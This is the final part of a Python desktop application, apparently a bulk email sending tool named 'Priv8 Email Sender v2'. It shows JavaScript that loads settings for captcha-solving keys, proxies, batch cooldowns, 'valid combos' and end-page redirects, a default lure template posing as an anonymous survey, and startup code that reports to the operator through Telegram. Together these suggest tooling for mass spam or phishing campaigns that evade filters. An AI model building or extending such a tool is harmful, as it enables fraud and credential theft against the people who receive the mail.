    batch_size:'batch_size',cd_min:'cd_min',cd_max:'cd_max',
    tg_token:'tg_token',tg_chat:'tg_chat',
    reply_to:'reply_to',send_mode:'send_mode',schedule_dt:'schedule_dt',
    end_page_type:'end_page_type',end_page_url:'end_page_url',
    end_page_msg:'end_page_msg',
    captcha_key:'captcha_key',proxy_str:'proxy_str'};
  for(const[k,id]of Object.entries(m)){
    const el=document.getElementById(id);
    if(el&&c[k]!=null)el.value=c[k];
  }
  if(c.banner1)document.getElementById('c_b1').value=c.banner1;
  if(c.banner2)document.getElementById('c_b2').value=c.banner2;
  const hb=document.getElementById('hidden_browser');
  if(hb)hb.checked=!!c.hidden_browser;
  toggleEndPageFields();
  toggleSchedule();
}

//  ALWAYS-ON valid table refresh (5s) 
setInterval(async()=>{
  if(_checkPoll) return; // check poll already refreshes
  try{
    const v=await pywebview.api.get_valid_combos();
    renderValid(v);
    document.getElementById('valid-cnt').textContent=v.length;
  }catch(e){}
},5000);

//  INIT 
window.addEventListener('pywebviewready', async()=>{
  await loadCfg();
  const valids=await pywebview.api.get_valid_combos();
  renderValid(valids);
  document.getElementById('st-valid').textContent=valids.length;
  document.getElementById('valid-cnt').textContent=valids.length;
  document.getElementById('send-wrap').style.display='none';
  // Init templates with defaults
  _templates=[{
    title:"We'd Love Your Feedback!",
    subtitle:"Your opinion shapes our future",
    body:"We are conducting a <strong>short 3-minute survey</strong> to better understand your needs. Your feedback is extremely valuable to us. The survey is completely <strong>anonymous</strong>.",
    show_title:false,
    show_icons:true
  }];
  // Load DB badge
  const dbr=await pywebview.api.get_db_stats();
  document.getElementById('db-cnt').textContent=`DB: ${dbr.count} registered`;
  // Auto-show Resume button if previous session was interrupted
  try{
    const ckpt=await pywebview.api.get_startup_checkpoint();
    if(ckpt&&ckpt.found){
      const resumeBtn=document.getElementById('resume-btn');
      if(resumeBtn){
        resumeBtn.style.display='inline-block';
        resumeBtn.textContent=` Resume: ${ckpt.file} #${ckpt.idx.toLocaleString()}/${ckpt.total.toLocaleString()}`;
        addLog('info',`  Checkpoint found: ${ckpt.file}  stopped at #${ckpt.idx.toLocaleString()}/${ckpt.total.toLocaleString()} (${ckpt.saved_at})`);
      }
    }
  }catch(e){}
});
</script>
</body>
</html>"""


# 
#  MAIN
# 

if __name__ == "__main__":
    import atexit
    import signal

    # Track if running
    is_running = True

    def cleanup(signum=None, frame=None):
        """Protected shutdown - only allow intentional close"""
        global is_running
        if not is_running:
            return
        is_running = False
        print("[ALERT] Application closing - sending alert to Telegram...")
        try:
            cfg = _load_cfg()
            tg_token = cfg.get("tg_token", "")
            tg_chat = cfg.get("tg_chat", "")
            if tg_token and tg_chat:
                import urllib.request
                msg = f"[ALERT] Priv8 Email Sender v2 closed at {time.strftime('%Y-%m-%d %H:%M:%S')}\nCheck for errors"
                urllib.request.urlopen(
                    f"https://api.telegram.org/bot{tg_token}/sendMessage?"
                    f"chat_id={tg_chat}&text={urllib.parse.quote(msg)}",
                    timeout=5
                )
        except Exception as e:
            print(f"[ERROR] Failed to send alert: {e}")
        sys.exit(0)

    # Register signal handlers for clean shutdown
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    atexit.register(cleanup)

    try:
        db_init()
        api = API()

        # Load TG credentials + API keys from saved cfg
        cfg = _load_cfg()
        tg_token = cfg.get("tg_token", "")
        tg_chat  = cfg.get("tg_chat",  "")
        if cfg.get("captcha_key"): CAPTCHA_KEY = cfg["captcha_key"]
        if cfg.get("proxy_str"):   _DEFAULT_PROXY = cfg["proxy_str"]

        print("[OK] Application starting...")
        print(f"[OK] Telegram alerts: {'Enabled' if tg_token and tg_chat else 'Disabled'}")

        # Start background threads
        if tg_token and tg_chat:
            threading.Thread(target=_tg_callback_poll_thread,
                             args=(tg_token, tg_chat), daemon=True).start()
            threading.Thread(target=_health_monitor_thread,
                             args=(tg_token, tg_chat), daemon=True).start()

        window = webview.create_window(
            "Priv8 Email Sender v2",
            html=HTML,
            js_api=api,
            width=1200,
            height=800,
            min_size=(960, 660),
            background_color="#07101a",
        )
        webview.start(debug=False)
    except KeyboardInterrupt:
        print("[INTERRUPT] User terminated application")
        cleanup()
    except Exception as e:
        print(f"[FATAL] {e}")
        import traceback
        traceback.print_exc()
        cleanup()
        sys.exit(1)

